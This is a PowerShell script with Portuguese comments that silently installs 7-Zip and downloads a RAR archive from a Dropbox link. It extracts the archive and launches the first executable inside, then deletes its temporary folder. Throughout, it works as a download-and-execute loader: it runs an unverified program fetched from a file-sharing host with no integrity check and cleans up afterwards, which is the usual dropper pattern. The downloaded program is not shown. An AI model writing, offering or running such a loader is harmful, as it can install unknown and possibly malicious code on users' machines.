# Função para verificar se o 7-Zip está instalado
function Test-7Zip {
    $7zipPath = "C:\Program Files\7-Zip\7z.exe"
    return Test-Path $7zipPath
}

# Função para instalar o 7-Zip silenciosamente
function Install-7Zip {
    Write-Host "Instalando 7-Zip..." -ForegroundColor Yellow
    $7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"
    $installerPath = "$env:TEMP\7zip-installer.exe"
    
    try {
        Invoke-WebRequest -Uri $7zipUrl -OutFile $installerPath
        Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
        Remove-Item $installerPath -Force
        return $true
    } catch {
        Write-Host "Erro ao instalar 7-Zip: $_" -ForegroundColor Red
        return $false
    }
}

# Função para extrair arquivo
function Extract-Archive {
    param (
        [string]$archivePath,
        [string]$destination
    )
    
    if (Test-7Zip) {
        $7zipPath = "C:\Program Files\7-Zip\7z.exe"
        $process = Start-Process -FilePath $7zipPath -ArgumentList "x", "-y", "-o$destination", $archivePath -Wait -PassThru
        return $process.ExitCode -eq 0
    }
    return $false
}

# Cria pasta temporária
$tempFolder = Join-Path $env:TEMP "sv_temp"
New-Item -ItemType Directory -Force -Path $tempFolder | Out-Null

try {
    # Verifica/Instala 7-Zip
    if (-not (Test-7Zip)) {
        if (-not (Install-7Zip)) {
            throw "Não foi possível instalar o 7-Zip"
        }
    }

    # Download do arquivo
    Write-Host "Baixando arquivo..." -ForegroundColor Yellow
    $url = "https://www.dropbox.com/scl/fi/jave5rw3bbj755ss5c900/servidor-download.rar?dl=1"
    $outputPath = Join-Path $tempFolder "programa.rar"
    
    # Download com retry
    $maxRetries = 3
    $retryCount = 0
    $success = $false
    
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
            if (Test-Path $outputPath) {
                $success = $true
                Write-Host "Download concluído!" -ForegroundColor Green
            }
        } catch {
            $retryCount++
            if ($retryCount -lt $maxRetries) {
                Write-Host "Tentativa $retryCount de $maxRetries falhou. Tentando novamente..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
            }
        }
    }
    
    if (-not $success) {
        throw "Não foi possível baixar o arquivo após $maxRetries tentativas"
    }
    
    # Extrai o arquivo
    Write-Host "Extraindo arquivo..." -ForegroundColor Yellow
    $extractPath = Join-Path $tempFolder "extracted"
    New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
    
    if (Extract-Archive -archivePath $outputPath -destination $extractPath) {
        # Procura por executáveis na pasta extraída
        $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse
        if ($exeFiles.Count -gt 0) {
            Write-Host "Executando programa..." -ForegroundColor Green
            Start-Process $exeFiles[0].FullName
        } else {
            throw "Nenhum executável encontrado na pasta extraída."
        }
    } else {
        throw "Erro ao extrair o arquivo."
    }
    
} catch {
    Write-Host "Erro: $_" -ForegroundColor Red
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
} finally {
    # Aguarda um pouco antes de limpar
    Start-Sleep -Seconds 5
    # Limpa arquivos temporários
    Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
} 
